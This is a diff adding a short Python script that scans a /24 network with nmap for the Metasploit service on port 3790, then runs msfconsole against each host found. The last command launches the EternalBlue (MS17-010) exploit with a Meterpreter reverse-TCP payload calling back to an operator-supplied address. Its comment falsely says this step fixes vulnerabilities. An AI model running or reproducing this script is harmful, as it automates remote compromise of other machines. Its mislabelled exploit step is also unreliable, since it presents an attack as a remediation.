@@ -1,0 +1,27 @@
+import nmap
+import os
+
+# Create an instance of the Nmap scanner
+scanner = nmap.PortScanner()
+
+# Set the target IP range to scan
+target_ip = "192.168.1.0/24"
+
+# Set the Metasploit Framework service name and port number
+metasploit_service_name = "msf"
+metasploit_port = 3790
+
+# Scan the target IP range for the Metasploit service
+scanner.scan(hosts=target_ip, arguments=f"-p {metasploit_port} --open")
+
+# Loop through each discovered host and check if the Metasploit service is open
+for host in scanner.all_hosts():
+    if scanner[host]["tcp"][metasploit_port]["state"] == "open":
+        # If the Metasploit service is open, print a message indicating that Metasploit is detected on the host
+        print(f"Metasploit Framework detected on {host}")
+
+        # Use Metasploit to check for vulnerabilities on the host
+        os.system(f"msfconsole -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS {host}; run; exit'")
+
+        # Use Metasploit to fix any detected vulnerabilities on the host
+        os.system(f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {host}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST YOUR_IP_ADDRESS; run; exit'")
